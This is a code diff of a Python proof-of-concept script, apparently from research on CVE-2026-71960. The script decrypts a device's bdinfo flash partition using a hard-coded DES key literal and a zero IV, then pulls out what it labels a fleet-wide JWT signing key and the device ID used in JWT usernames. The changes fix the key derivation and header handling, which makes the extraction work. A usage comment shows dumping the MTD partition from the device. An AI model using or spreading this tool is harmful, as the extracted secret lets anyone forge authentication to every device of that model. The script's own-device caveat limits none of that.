@@ -8,10 +8,12 @@ DES-CBC encrypted MTD partition:
 
     key = DES_string_to_key("88T3j05dtFu8=")     # literal in libbdinfo.so
     iv  = 8 zero bytes
-    pt  = DES-CBC-decrypt(dump)
+    pt  = DES-CBC-decrypt(dump[4:])              # 4-byte container header
 
-Both the literal and the zero IV were verified by disassembling
-libbdinfo.so from firmware 2.4.15 (CVE-2026-71960 research).
+The literal and the zero IV come from libbdinfo.so 2.4.15. The key is the
+OpenSSL DES_string_to_key (MIT krb4) variant, not the RFC 3961 one, and the
+live 2.4.15 partition carries a 4-byte header before the ciphertext. Both
+were confirmed against a live mtd6 dump (CVE-2026-71960 research).
 
 Usage (against a dump from YOUR OWN device, e.g.
 `cat /dev/mtd$(grep bdinfo /proc/mtd ... ) > bdinfo.bin`):
@@ -39,18 +41,22 @@ def parity(b):
 
 
 def des_string_to_key(s: bytes) -> bytes:
-    """MIT Kerberos / OpenSSL DES_string_to_key (no salt), per RFC 3961."""
-    if len(s) % 2:
-        s = s + b"\x00"                      # pad to even length
-    temp = bytearray(8)
+    """OpenSSL DES_string_to_key (MIT krb4), the variant libbdinfo.so calls."""
+    key = bytearray(8)
     for i, ch in enumerate(s):
-        temp[i % 8] ^= (ch << 1) & 0xFF
-        if i >= 8:
-            temp[7 - (i % 8)] ^= ch
-    temp = parity(temp)
-    from Crypto.Cipher import DES            # zero key + zero IV CBC pass
-    cbc = DES.new(b"\x00" * 8, DES.MODE_CBC, b"\x00" * 8)
-    return parity(cbc.encrypt(temp))
+        j = ch
+        if i % 16 < 8:
+            key[i % 8] ^= (j << 1) & 0xFF
+        else:
+            j = ((j << 4) & 0xF0) | ((j >> 4) & 0x0F)
+            j = ((j << 2) & 0xCC) | ((j >> 2) & 0x33)
+            j = ((j << 1) & 0xAA) | ((j >> 1) & 0x55)
+            key[7 - (i % 8)] ^= j
+    key = parity(key)
+    data = s + b"\x00" * ((-len(s)) % 8)
+    from Crypto.Cipher import DES
+    cbc = DES.new(bytes(key), DES.MODE_CBC, bytes(key))
+    return parity(cbc.encrypt(data)[-8:])
 
 
 def des_cbc_decrypt(key: bytes, data: bytes) -> bytes:
@@ -73,19 +79,34 @@ def main():
         print(f"    key[{i}] = 0x{b:02x} ({b:08b}, parity {b & 1})")
 
     blob = open(args.dump, "rb").read()
-    pt = des_cbc_decrypt(key, blob)
-    printable = sum(32 <= b < 127 or b in (9, 10, 13) for b in pt)
-    if printable / max(len(pt), 1) < 0.6:
-        print("[!] plaintext ratio low — dump may not be a bdinfo partition,")
-        print("    or the format differs on this firmware. Raw tail shown below.")
-    kv = dict(re.findall(rb"(\w+)\s*=\s*([^\r\n]+)", pt))
+    last = max((i for i, b in enumerate(blob) if b != 0xFF), default=-1)
+    if last >= 0:
+        blob = blob[: last + 1]
+
+    best = None
+    for off in range(0, 17, 4):
+        pt = des_cbc_decrypt(key, blob[off:])
+        score = (pt.count(b"board = ") * 2 + pt.count(b"BDINFO_END")) * 1000
+        score += sum(32 <= b < 127 or b in (9, 10, 13) for b in pt[:512])
+        if best is None or score > best[0]:
+            best = (score, off, pt)
+    _, offset, pt = best
+    print(f"[*] decrypted from dump offset {offset} ({len(pt)} bytes)")
+
+    text = pt.split(b"\x00", 1)[0]
+    if b"BDINFO_END" in text:
+        text = text.split(b"BDINFO_END", 1)[0]
+    if b"board = " not in text:
+        print("[!] no bdinfo header found — dump may not be a bdinfo partition,")
+        print("    or the format differs on this firmware. Raw head shown below.")
+    kv = dict(re.findall(rb"([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([^\r\n]+)", text))
     print(f"[+] parsed {len(kv)} key = value pairs:")
     for k, v in kv.items():
         tag = ""
         if k == b"secret":
             tag = "   <-- fleet-wide JWT signing key (CVE-2026-71960)"
         if k == b"deviceid":
-            tag = "   <-- 12-digit mesh identifier (needed in JWT username)"
+            tag = "   <-- deviceid (used in the JWT username)"
         print(f"    {k.decode(errors='replace'):12} = {v.decode(errors='replace')}{tag}")
     if b"secret" in kv:
         print("\n[!] handle this material responsibly: it authenticates to every")
